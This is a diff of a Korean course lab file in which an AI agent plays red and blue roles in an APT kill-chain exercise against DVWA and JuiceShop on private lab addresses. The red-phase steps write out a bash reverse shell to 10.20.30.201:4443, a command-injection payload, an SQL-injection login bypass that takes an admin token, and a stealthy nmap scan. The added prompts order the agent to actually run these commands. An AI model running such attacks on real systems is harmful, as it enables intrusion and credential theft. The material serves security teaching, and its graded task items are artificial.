@@ -3,8 +3,8 @@ title: 실전 공방전 4 — APT 시뮬레이션 (Red Phase → Blue Phase → 
 version: ai
 course: battle-ai
 week: 14
-description: 1세트 인프라에서 Red/Blue 역할을 번갈아 수행한다. Red Phase에서 APT 킬체인(정찰→무기화→전달→익스플로잇→설치→C2→목표달성)을 시뮬레이션하고,
-  Blue Phase에서 각 단계를 탐지하고 대응한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
+description: 1세트 인프라에서 Red/Blue 역할을 번갈아 수행한다. Red Phase에서 APT 킬체인(정찰→무기화→전달→익스플로잇→설치→C2→목표달성)을
+  시뮬레이션하고, Blue Phase에서 각 단계를 탐지하고 대응한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: medium
 duration_minutes: 120
 objectives:
@@ -27,17 +27,19 @@ steps:
   points: 10
   answer: '🤖 프롬프트: [RED] APT 킬체인 1단계: 정찰(Reconnaissance)해줘
 
-    📎 참고 (CLI): nmap -sV -T2 -p 22,80,3000,8080 --max-retries 1 --host-timeout 30s 10.20.30.80 -oX /tmp/apt_recon.xml
-    && echo ''Stealthy recon complete'''
-  answer_detail: APT 공격의 정찰 단계는 일반 스캔보다 은밀하게 수행한다. -T2(polite)로 속도를 줄여 IDS threshold 탐지를 회피한다.
+    📎 참고 (CLI): nmap -sV -T2 -p 22,80,3000,8080 --max-retries 1 --host-timeout 30s
+    10.20.30.80 -oX /tmp/apt_recon.xml && echo ''Stealthy recon complete'''
+  answer_detail: APT 공격의 정찰 단계는 일반 스캔보다 은밀하게 수행한다. -T2(polite)로 속도를 줄여 IDS threshold
+    탐지를 회피한다.
   verify:
     type: output_contains
     expect: Stealthy recon complete
     field: stdout
     semantic:
-      intent: '[RED] APT Kill Chain Phase 1 Reconnaissance — whois web.target + dig DNS A/MX + shodan
-        search + curl headers (은밀한 passive recon 우선, active 최소). Lockheed Martin Cyber Kill Chain 첫 단계.
-        탐지 회피 위해 third-party 소스 활용, 직접 probe 최소화. MITRE T1590 Gather Victim Info'
+      intent: '[RED] APT Kill Chain Phase 1 Reconnaissance — whois web.target + dig
+        DNS A/MX + shodan search + curl headers (은밀한 passive recon 우선, active 최소).
+        Lockheed Martin Cyber Kill Chain 첫 단계. 탐지 회피 위해 third-party 소스 활용, 직접 probe
+        최소화. MITRE T1590 Gather Victim Info'
       success_criteria:
       - passive 정찰 우선 (whois/dig/shodan)
       - 은밀성 강조 (직접 스캔 최소화)
@@ -52,10 +54,13 @@ steps:
       - Kill Chain 개념 없음
       - T1590 매핑 없음
   target_vm: attacker
-  script: nmap -sV -T2 -p 22,80,3000,8080 --max-retries 1 --host-timeout 30s 10.20.30.80 -oX /tmp/apt_recon.xml
-    && echo 'Stealthy recon complete'
+  script: nmap -sV -T2 -p 22,80,3000,8080 --max-retries 1 --host-timeout 30s 10.20.30.80
+    -oX /tmp/apt_recon.xml && echo 'Stealthy recon complete'
   risk_level: low
-  bastion_prompt: '[RED] APT 킬체인 1단계: 정찰(Reconnaissance)해줘'
+  bastion_prompt: '[RED] APT 킬체인 1단계: 정찰(Reconnaissance)해줘
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
 - order: 2
   instruction: '[RED] APT 킬체인 2단계: 무기화(Weaponization). 대상에 맞춘 공격 페이로드를 준비하라.'
   hint: 리버스 셸 페이로드를 준비한다.
@@ -64,17 +69,18 @@ steps:
   answer: '🤖 프롬프트: [RED] APT 킬체인 2단계: 무기화(Weaponization)해줘
 
     📎 참고 (CLI): echo ''#!/bin/bash'' > /tmp/payload.sh && echo ''bash -i >& /dev/tcp/10.20.30.201/4443
-    0>&1'' >> /tmp/payload.sh && chmod +x /tmp/payload.sh && echo ''Payload weaponized: reverse shell
-    to 10.20.30.201:4443'''
-  answer_detail: bash 리버스 셸은 추가 도구 없이 대부분의 Linux 시스템에서 동작한다. 공격자의 IP(10.20.30.201)로 역방향 연결을 수립한다.
+    0>&1'' >> /tmp/payload.sh && chmod +x /tmp/payload.sh && echo ''Payload weaponized:
+    reverse shell to 10.20.30.201:4443'''
+  answer_detail: bash 리버스 셸은 추가 도구 없이 대부분의 Linux 시스템에서 동작한다. 공격자의 IP(10.20.30.201)로
+    역방향 연결을 수립한다.
   verify:
     type: output_contains
     expect: Payload weaponized
     field: stdout
     semantic:
-      intent: '[RED] APT Kill Chain Phase 2 Weaponization — 정찰 결과 기반 맞춤 페이로드 준비. msfvenom 으로 reverse shell·SQLi
-        payload 파일 생성·Metasploit resource script·Cobalt Strike beacon 설정. 대상 기술 스택(Apache/Node.js)에 최적화.
-        MITRE T1587 Develop Capabilities'
+      intent: '[RED] APT Kill Chain Phase 2 Weaponization — 정찰 결과 기반 맞춤 페이로드 준비. msfvenom
+        으로 reverse shell·SQLi payload 파일 생성·Metasploit resource script·Cobalt Strike
+        beacon 설정. 대상 기술 스택(Apache/Node.js)에 최적화. MITRE T1587 Develop Capabilities'
       success_criteria:
       - 페이로드 생성 도구 사용 (msfvenom/sqlmap/커스텀)
       - 대상 맞춤 (기술 스택 반영)
@@ -89,27 +95,34 @@ steps:
       - Weaponization 단계 인지 없음
       - 정찰 결과 반영 없음
   target_vm: attacker
-  script: 'echo ''#!/bin/bash'' > /tmp/payload.sh && echo ''bash -i >& /dev/tcp/10.20.30.201/4443 0>&1''
-    >> /tmp/payload.sh && chmod +x /tmp/payload.sh && echo ''Payload weaponized: reverse shell to 10.20.30.201:4443'''
+  script: 'echo ''#!/bin/bash'' > /tmp/payload.sh && echo ''bash -i >& /dev/tcp/10.20.30.201/4443
+    0>&1'' >> /tmp/payload.sh && chmod +x /tmp/payload.sh && echo ''Payload weaponized:
+    reverse shell to 10.20.30.201:4443'''
   risk_level: medium
-  bastion_prompt: '[RED] APT 킬체인 2단계: 무기화(Weaponization)해줘'
+  bastion_prompt: '[RED] APT 킬체인 2단계: 무기화(Weaponization)해줘
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
 - order: 3
-  instruction: '[RED] APT 킬체인 3단계: 전달(Delivery). DVWA Command Injection으로 web 서버에서 정보를 추출하라.'
+  instruction: '[RED] APT 킬체인 3단계: 전달(Delivery). DVWA Command Injection으로 web 서버에서
+    정보를 추출하라.'
   hint: Command Injection을 통해 시스템 정보를 수집한다.
   category: exploit
   points: 10
-  answer: "\U0001F916 프롬프트: [RED] APT 킬체인 3단계: 전달(Delivery). DVWA Command Injection으로 web 서버에서 정보를 추출해줘\n\
-    \U0001F4CE 참고 (CLI): curl -c /tmp/dvwa_apt.txt \\\n  -d 'username=admin&password=password&Login=Login'\
+  answer: "\U0001F916 프롬프트: [RED] APT 킬체인 3단계: 전달(Delivery). DVWA Command Injection으로\
+    \ web 서버에서 정보를 추출해줘\n\U0001F4CE 참고 (CLI): curl -c /tmp/dvwa_apt.txt \\\n  -d 'username=admin&password=password&Login=Login'\
     \ http://10.20.30.80:8080/login.php && curl -b /tmp/dvwa_apt.txt \\\n  -d 'ip=127.0.0.1;cat+/etc/hostname&Submit=Submit'\
     \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -v '<' | tail -5"
-  answer_detail: Command Injection을 통해 시스템 정보(hostname, uname, id)를 수집한다. 이 정보로 후속 공격을 정밀하게 조정한다.
+  answer_detail: Command Injection을 통해 시스템 정보(hostname, uname, id)를 수집한다. 이 정보로 후속
+    공격을 정밀하게 조정한다.
   verify:
     type: output_contains
     expect: 127.0.0.1
     field: stdout
     semantic:
-      intent: '[RED] APT Kill Chain Phase 3 Delivery — DVWA Command Injection 으로 web 서버에서 내부 정보 추출 (id·hostname·uname·crontab·ifconfig·ps).
-        초기 접근 벡터로 alreadyexposed 취약점 활용. Kill Chain Delivery + Exploitation 경계 (페이로드 전달 + 실행). MITRE T1190
+      intent: '[RED] APT Kill Chain Phase 3 Delivery — DVWA Command Injection 으로 web
+        서버에서 내부 정보 추출 (id·hostname·uname·crontab·ifconfig·ps). 초기 접근 벡터로 alreadyexposed
+        취약점 활용. Kill Chain Delivery + Exploitation 경계 (페이로드 전달 + 실행). MITRE T1190
         Exploit Public-Facing App'
       success_criteria:
       - DVWA Command Injection 페이로드 전달
@@ -125,11 +138,15 @@ steps:
       - 외부 (Delivery) 경로 설명 없음
       - T1190 매핑 없음
   target_vm: attacker
-  script: "curl -c /tmp/dvwa_apt.txt \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php\
-    \ && curl -b /tmp/dvwa_apt.txt \\\n  -d 'ip=127.0.0.1;cat+/etc/hostname&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
-    \ \\\n | grep -v '<' | tail -5"
+  script: "curl -c /tmp/dvwa_apt.txt \\\n  -d 'username=admin&password=password&Login=Login'\
+    \ http://10.20.30.80:8080/login.php && curl -b /tmp/dvwa_apt.txt \\\n  -d 'ip=127.0.0.1;cat+/etc/hostname&Submit=Submit'\
+    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -v '<' | tail -5"
   risk_level: medium
-  bastion_prompt: '[RED] APT 킬체인 3단계: 전달(Delivery). DVWA Command Injection으로 web 서버에서 정보를 추출해줘'
+  bastion_prompt: '[RED] APT 킬체인 3단계: 전달(Delivery). DVWA Command Injection으로 web 서버에서
+    정보를 추출해줘
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
 - order: 4
   instruction: '[BLUE] 초기 침투 시도를 탐지하라. Suricata와 Apache 로그에서 공격 흔적을 분석한다.'
   hint: eve.json과 access.log를 병합 분석한다.
@@ -137,17 +154,17 @@ steps:
   points: 10
   answer: '🤖 프롬프트: [BLUE] 초기 침투 시도를 탐지하라. Suricata와 Apache 로그에서 공격 흔적을 분석한다해줘
 
-    📎 참고 (CLI): echo ''=== Suricata ==='' && tail -10 /var/log/suricata/fast.log && echo ''=== Detection
-    analysis complete ==='''
+    📎 참고 (CLI): echo ''=== Suricata ==='' && tail -10 /var/log/suricata/fast.log &&
+    echo ''=== Detection analysis complete ==='''
   answer_detail: APT의 초기 단계를 빠르게 탐지하면 킬체인을 조기에 차단할 수 있다. 정찰과 전달 단계에서의 비정상 패턴을 확인한다.
   verify:
     type: output_contains
     expect: Detection analysis complete
     field: stdout
     semantic:
-      intent: '[BLUE] 초기 침투 탐지 — Suricata fast.log 에서 WEB-ATTACK·CMD 경보 + Apache access.log 에서 /exec/
-        요청 + 비정상 URL 패턴 (;·|·$(·&) grep. APT 의 초기 접근은 is-정찰 시 은밀했어도 exploitation 단계에서는 시그니처 남김. 이 순간 탐지가
-        contain 의 핵심'
+      intent: '[BLUE] 초기 침투 탐지 — Suricata fast.log 에서 WEB-ATTACK·CMD 경보 + Apache access.log
+        에서 /exec/ 요청 + 비정상 URL 패턴 (;·|·$(·&) grep. APT 의 초기 접근은 is-정찰 시 은밀했어도 exploitation
+        단계에서는 시그니처 남김. 이 순간 탐지가 contain 의 핵심'
       success_criteria:
       - Suricata + Apache 교차 조회
       - /exec/ + 명령 구분자 패턴 탐지
@@ -162,8 +179,8 @@ steps:
       - 네트워크 또는 호스트 한쪽만
       - APT 맥락 없음
   target_vm: secu
-  script: echo '=== Suricata ===' && tail -10 /var/log/suricata/fast.log && echo '=== Detection analysis
-    complete ==='
+  script: echo '=== Suricata ===' && tail -10 /var/log/suricata/fast.log && echo '===
+    Detection analysis complete ==='
   risk_level: low
   bastion_prompt: '[BLUE] 초기 침투 시도를 탐지하라. Suricata와 Apache 로그에서 공격 흔적을 분석한다해줘'
 - order: 5
@@ -173,17 +190,20 @@ steps:
   points: 15
   answer: '🤖 프롬프트: [RED] APT 킬체인 4단계: 익스플로잇(Exploitation). JuiceShop에서 관리자 접근을 확보해줘
 
-    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
-    -d ''{"email":"'' or 1=1--","password":"x"}'' | jq -r ''.authentication.token'' 2>/dev/null) && echo
-    "Admin token acquired: ${TOKEN:0:20}..."'
-  answer_detail: JuiceShop SQLi로 관리자 토큰을 획득하면 관리 API에 접근할 수 있다. 토큰을 변수에 저장하여 후속 공격에 활용한다.
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
+    ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"x"}''
+    | jq -r ''.authentication.token'' 2>/dev/null) && echo "Admin token acquired:
+    ${TOKEN:0:20}..."'
+  answer_detail: JuiceShop SQLi로 관리자 토큰을 획득하면 관리 API에 접근할 수 있다. 토큰을 변수에 저장하여 후속 공격에
+    활용한다.
   verify:
     type: output_contains
     expect: Admin token acquired
     field: stdout
     semantic:
-      intent: '[RED] APT Kill Chain Phase 4 Exploitation — JuiceShop SQLi 인증 우회 (/rest/user/login) 로 관리자
-        JWT 획득 + /api/Users 전체 사용자 조회 + admin 권한 시뮬레이션. 취약점 실제 악용 단계. MITRE T1078 Valid Accounts (권한 탈취)'
+      intent: '[RED] APT Kill Chain Phase 4 Exploitation — JuiceShop SQLi 인증 우회 (/rest/user/login)
+        로 관리자 JWT 획득 + /api/Users 전체 사용자 조회 + admin 권한 시뮬레이션. 취약점 실제 악용 단계. MITRE
+        T1078 Valid Accounts (권한 탈취)'
       success_criteria:
       - JuiceShop SQLi 로 관리자 토큰 획득
       - /api/Users 또는 admin 기능 접근
@@ -198,11 +218,14 @@ steps:
       - Exploitation 단계 명시 없음
       - T1078 매핑 없음
   target_vm: attacker
-  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
-    -d ''{"email":"'' or 1=1--","password":"x"}'' | jq -r ''.authentication.token'' 2>/dev/null) && echo
-    "Admin token acquired: ${TOKEN:0:20}..."'
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
+    application/json'' -d ''{"email":"'' or 1=1--","password":"x"}'' | jq -r ''.authentication.token''
+    2>/dev/null) && echo "Admin token acquired: ${TOKEN:0:20}..."'
   risk_level: medium
-  bastion_prompt: '[RED] APT 킬체인 4단계: 익스플로잇(Exploitation). JuiceShop에서 관리자 접근을 확보해줘'
+  bastion_prompt: '[RED] APT 킬체인 4단계: 익스플로잇(Exploitation). JuiceShop에서 관리자 접근을 확보해줘
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
 - order: 6
   instruction: '[RED] APT 킬체인 5단계: 설치(Installation). 지속성을 확보하기 위한 계획을 수립하라.'
   hint: SSH 키, cron job, systemd 서비스 등의 옵션을 검토한다.
@@ -243,15 +266,17 @@ steps:
     EOF
 
     cat /tmp/persistence_plan.txt'
-  answer_detail: 지속성 확보는 APT의 핵심 단계이다. 여러 옵션 중 가장 은밀한 방법을 선택한다. SSH 키는 탐지가 어렵고 패스워드 변경에 영향받지 않는다.
+  answer_detail: 지속성 확보는 APT의 핵심 단계이다. 여러 옵션 중 가장 은밀한 방법을 선택한다. SSH 키는 탐지가 어렵고 패스워드
+    변경에 영향받지 않는다.
   verify:
     type: output_contains
     expect: APT Persistence Plan
     field: stdout
     semantic:
-      intent: '[RED] APT Kill Chain Phase 5 Installation — 지속성 계획 수립 문서 /tmp/persistence_plan.txt 에 3가지
-        후보: SSH 키 백도어 (authorized_keys T1098.004) · cron 예약 작업 (T1053.003) · systemd user service (T1543.002).
-        탐지·제거 난이도 + 재부팅 내성 비교. 실제 설치는 접근 권한에 따라 결정'
+      intent: '[RED] APT Kill Chain Phase 5 Installation — 지속성 계획 수립 문서 /tmp/persistence_plan.txt
+        에 3가지 후보: SSH 키 백도어 (authorized_keys T1098.004) · cron 예약 작업 (T1053.003) ·
+        systemd user service (T1543.002). 탐지·제거 난이도 + 재부팅 내성 비교. 실제 설치는 접근 권한에 따라
+        결정'
       success_criteria:
       - /tmp/persistence_plan.txt 또는 계획 문서 생성
       - 3가지 지속성 기법 비교 (SSH/cron/systemd)
@@ -300,7 +325,10 @@ steps:
 
     cat /tmp/persistence_plan.txt'
   risk_level: medium
-  bastion_prompt: '[RED] APT 킬체인 5단계: 설치(Installation)해줘'
+  bastion_prompt: '[RED] APT 킬체인 5단계: 설치(Installation)해줘
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
 - order: 7
   instruction: '[BLUE] 지속성 기법을 탐지하라. SSH 키, cron, systemd에서 비정상 항목을 검사한다.'
   hint: authorized_keys, crontab, systemd 유닛을 확인한다.
@@ -308,19 +336,21 @@ steps:
   points: 10
   answer: '🤖 프롬프트: [BLUE] 지속성 기법을 탐지하라. SSH 키, cron, systemd에서 비정상 항목을 검사한다해줘
 
-    📎 참고 (CLI): echo ''=== SSH Keys ==='' && find /home -name ''authorized_keys'' -exec wc -l {} \; 2>/dev/null
-    && echo ''=== Cron ==='' && cat /etc/crontab | grep -v ''^#'' | grep -v ''^$'' && echo ''=== Recent
-    systemd ==='' && find /etc/systemd/system -newer /etc/hostname -type f 2>/dev/null && echo ''Persistence
-    scan complete'''
-  answer_detail: APT 지속성 기법을 체계적으로 검사한다. authorized_keys의 줄 수 변화, 새로운 cron 항목, 최근 생성된 systemd 유닛을 확인한다.
+    📎 참고 (CLI): echo ''=== SSH Keys ==='' && find /home -name ''authorized_keys''
+    -exec wc -l {} \; 2>/dev/null && echo ''=== Cron ==='' && cat /etc/crontab | grep
+    -v ''^#'' | grep -v ''^$'' && echo ''=== Recent systemd ==='' && find /etc/systemd/system
+    -newer /etc/hostname -type f 2>/dev/null && echo ''Persistence scan complete'''
+  answer_detail: APT 지속성 기법을 체계적으로 검사한다. authorized_keys의 줄 수 변화, 새로운 cron 항목, 최근
+    생성된 systemd 유닛을 확인한다.
   verify:
     type: output_contains
     expect: Persistence scan complete
     field: stdout
     semantic:
-      intent: '[BLUE] 지속성 기법 탐지 — 3가지 벡터 일괄 검사: find /home /root -name authorized_keys -exec cat (SSH
-        키 백도어 T1098.004) + cat /etc/crontab + ls /etc/cron.d/ (cron T1053.003) + systemctl --user list-units
-        + ls ~/.config/systemd/user/ (systemd user service T1543.002). 비정상 항목은 공격자 설치 가능성'
+      intent: '[BLUE] 지속성 기법 탐지 — 3가지 벡터 일괄 검사: find /home /root -name authorized_keys
+        -exec cat (SSH 키 백도어 T1098.004) + cat /etc/crontab + ls /etc/cron.d/ (cron
+        T1053.003) + systemctl --user list-units + ls ~/.config/systemd/user/ (systemd
+        user service T1543.002). 비정상 항목은 공격자 설치 가능성'
       success_criteria:
       - authorized_keys + crontab + systemd 3종 검사
       - MITRE T1098.004/T1053.003/T1543.002 매핑
@@ -335,10 +365,10 @@ steps:
       - T10xx 매핑 없음
       - 비정상 판단 기준 없음
   target_vm: web
-  script: echo '=== SSH Keys ===' && find /home -name 'authorized_keys' -exec wc -l {} \; 2>/dev/null
-    && echo '=== Cron ===' && cat /etc/crontab | grep -v '^#' | grep -v '^$' && echo '=== Recent systemd
-    ===' && find /etc/systemd/system -newer /etc/hostname -type f 2>/dev/null && echo 'Persistence scan
-    complete'
+  script: echo '=== SSH Keys ===' && find /home -name 'authorized_keys' -exec wc -l
+    {} \; 2>/dev/null && echo '=== Cron ===' && cat /etc/crontab | grep -v '^#' |
+    grep -v '^$' && echo '=== Recent systemd ===' && find /etc/systemd/system -newer
+    /etc/hostname -type f 2>/dev/null && echo 'Persistence scan complete'
   risk_level: low
   bastion_prompt: '[BLUE] 지속성 기법을 탐지하라. SSH 키, cron, systemd에서 비정상 항목을 검사한다해줘'
 - order: 8
@@ -348,17 +378,18 @@ steps:
   points: 10
   answer: '🤖 프롬프트: [BLUE] Wazuh SIEM에서 APT 공격 전체의 타임라인을 재구성해줘
 
-    📎 참고 (CLI): sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -30 | jq -r ''[.timestamp,
-    .rule.level, .rule.description] | @tsv'' 2>/dev/null | sort | tail -15 || echo ''SIEM timeline reconstruction
-    complete'''
+    📎 참고 (CLI): sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -30
+    | jq -r ''[.timestamp, .rule.level, .rule.description] | @tsv'' 2>/dev/null |
+    sort | tail -15 || echo ''SIEM timeline reconstruction complete'''
   answer_detail: Wazuh에서 시간순으로 이벤트를 정렬하면 APT 킬체인의 각 단계를 시각적으로 재구성할 수 있다.
   verify:
     type: output_contains
     expect: complete
     field: stdout
     semantic:
-      intent: '[BLUE] Wazuh APT 타임라인 재구성 — jq select(.event_type or .rule) | {ts: .timestamp, src: .data.srcip,
-        desc: .rule.description} alerts.json | sort 로 timestamp 기준 APT 전체 활동 순서 재구성. Recon(s1)→Weaponization(s2)→Delivery(s3)→Exploitation(s5)→Installation(s6)
+      intent: '[BLUE] Wazuh APT 타임라인 재구성 — jq select(.event_type or .rule) | {ts:
+        .timestamp, src: .data.srcip, desc: .rule.description} alerts.json | sort
+        로 timestamp 기준 APT 전체 활동 순서 재구성. Recon(s1)→Weaponization(s2)→Delivery(s3)→Exploitation(s5)→Installation(s6)
         단계별 이벤트 매핑. Incident Timeline 포렌식 기초'
       success_criteria:
       - timestamp 기준 정렬 + 순서 재구성
@@ -374,8 +405,9 @@ steps:
       - Kill Chain 단계 매핑 없음
       - 단일 이벤트만
   target_vm: siem
-  script: sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -30 | jq -r '[.timestamp, .rule.level,
-    .rule.description] | @tsv' 2>/dev/null | sort | tail -15 || echo 'SIEM timeline reconstruction complete'
+  script: sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -30 | jq
+    -r '[.timestamp, .rule.level, .rule.description] | @tsv' 2>/dev/null | sort |
+    tail -15 || echo 'SIEM timeline reconstruction complete'
   risk_level: low
   bastion_prompt: '[BLUE] Wazuh SIEM에서 APT 공격 전체의 타임라인을 재구성해줘'
 - order: 9
@@ -453,8 +485,9 @@ steps:
     expect: MITRE ATT&CK Mapping
     field: stdout
     semantic:
-      intent: '[공통] APT Kill Chain → MITRE ATT&CK 매핑 /tmp/kill_chain_attack_mapping.txt — 7단계(Recon/Weaponize/Deliver/Exploit/Install/C2/Actions)
-        각각에 MITRE Tactics (TA0043/TA0042/...) + Techniques (T1590/T1587/T1190/T1078/T1098/T1071/T1005)
+      intent: '[공통] APT Kill Chain → MITRE ATT&CK 매핑 /tmp/kill_chain_attack_mapping.txt
+        — 7단계(Recon/Weaponize/Deliver/Exploit/Install/C2/Actions) 각각에 MITRE Tactics
+        (TA0043/TA0042/...) + Techniques (T1590/T1587/T1190/T1078/T1098/T1071/T1005)
         매핑. Lockheed Kill Chain 와 MITRE ATT&CK 두 프레임워크 대조. 정부·기업 표준 위협 모델링'
       success_criteria:
       - /tmp/kill_chain_attack_mapping.txt 또는 매핑 표
@@ -618,15 +651,17 @@ steps:
     EOF
 
     cat /tmp/apt_battle_report.txt'
-  answer_detail: 최종 보고서는 APT 킬체인 전 단계의 성과를 분석한다. 탐지율, 대응 시간, 가용성 등 정량적 지표와 개선 권고사항을 포함한다.
+  answer_detail: 최종 보고서는 APT 킬체인 전 단계의 성과를 분석한다. 탐지율, 대응 시간, 가용성 등 정량적 지표와 개선 권고사항을
+    포함한다.
   verify:
     type: file_exists
     expect: /tmp/apt_battle_report.txt
     field: filesystem
     semantic:
-      intent: '[BLUE] APT 시뮬레이션 종합 보고서 /tmp/apt_simulation_report.txt — 서비스 가용성 최종 체크 + Kill Chain 7단계
-        각 공격 시도 결과 + 각 단계별 탐지 여부·MTTR·미탐지 gap + 방어 강화 권고(정찰 탐지·passive DNS·behavioral analytics·FIM·EDR).
-        APT 방어의 total view. Threat Intelligence 산출물'
+      intent: '[BLUE] APT 시뮬레이션 종합 보고서 /tmp/apt_simulation_report.txt — 서비스 가용성 최종
+        체크 + Kill Chain 7단계 각 공격 시도 결과 + 각 단계별 탐지 여부·MTTR·미탐지 gap + 방어 강화 권고(정찰 탐지·passive
+        DNS·behavioral analytics·FIM·EDR). APT 방어의 total view. Threat Intelligence
+        산출물'
       success_criteria:
       - /tmp/apt_simulation_report.txt 파일 생성
       - Kill Chain 각 단계 탐지 결과
@@ -767,5 +802,6 @@ steps:
     4) [BLUE] 초기 침투 시도를 탐지하라. Suricata와 Apache 로그에서 공격 흔적을 분석한다해줘
 
     5) [RED] APT 킬체인 4단계: 익스플로잇(Exploitation). JuiceShop에서 관리자 접근을 확보해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는 다단계 작업.
+  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
+    다단계 작업.
   script: ''
